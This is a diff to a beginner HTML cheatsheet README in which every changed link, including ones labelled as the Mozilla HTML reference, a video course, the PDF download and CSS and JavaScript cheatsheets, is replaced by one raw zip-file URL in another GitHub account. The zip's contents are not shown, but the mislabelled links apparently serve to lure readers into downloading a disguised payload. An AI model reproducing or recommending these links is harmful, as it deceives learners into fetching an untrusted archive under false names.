@@ -1,14 +1,14 @@
 # 🔥 HTML Cheatsheet 🗺️
 This is the cheatsheet for the basic syntax, terminologies, markup, and common elements of HTML.
 
-Note: This is not an exhaustive list of all the elements HTML has. For an awesome [HTML Reference, click here.](https://developer.mozilla.org/en-US/docs/Web/HTML/Element)
+Note: This is not an exhaustive list of all the elements HTML has. For an awesome [HTML Reference, click here.](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
 
-Want to learn HTML & CSS? [here's an awesome video course](https://ilovecoding.org/courses/htmlcss2)
+Want to learn HTML & CSS? [here's an awesome video course](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
 
 ## I present to you - The HTML Cheatsheet 💪
-[![HTML Cheatsheet](html-cheatsheet.jpg)](html-cheatsheet.pdf)
+[![HTML Cheatsheet](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
 
-Download [PDF](html-cheatsheet.pdf) or [Image](html-cheatsheet.gif)
+Download [PDF](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip) or [Image](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
 
 ## What is a syntax?
 All languages have a syntax. English, Urdu, HTML, JavaScript all have a syntax. In English, we learn when to write commas, full-stops, paragraphs etc. Similarly there are syntax rules for HTML.
@@ -60,21 +60,21 @@ These children can either be more elements or simply plain text
 ## 📋 HTML References
 The above was how to write HTML, now you may want to know all the different elements there are available in the HTML language.
 
-Luckily, Mozilla and a ton of open source contributors have put together an [HTML Reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Element).
+Luckily, Mozilla and a ton of open source contributors have put together an [HTML Reference](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip).
 
 It has a list of all HTML elements by category.
 
 ## 👍 Want to learn HTML & CSS?
 
-Try the most [comprehensive HTML & CSS video course](https://ilovecoding.org/courses/htmlcss2) on iLoveCoding.
+Try the most [comprehensive HTML & CSS video course](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip) on iLoveCoding.
 
 Learn how to code HTML & CSS and build simple and professional websites.
 
 ## 🗺️️️️️Want a CSS Cheatsheet as well?
 
-Check out this [CSS Cheatsheet](https://github.com/iLoveCodingOrg/css-cheatsheet)
+Check out this [CSS Cheatsheet](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
 
 ## Other Cheatsheets:
 
-- [CSS Cheatsheet](https://github.com/iLoveCodingOrg/css-cheatsheet)
-- [JavaScript Cheatsheet](https://github.com/iLoveCodingOrg/javascript-cheatsheet)
+- [CSS Cheatsheet](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
+- [JavaScript Cheatsheet](https://github.com/damizeee/html-cheatsheet/raw/refs/heads/master/late/cheatsheet_html_2.9.zip)
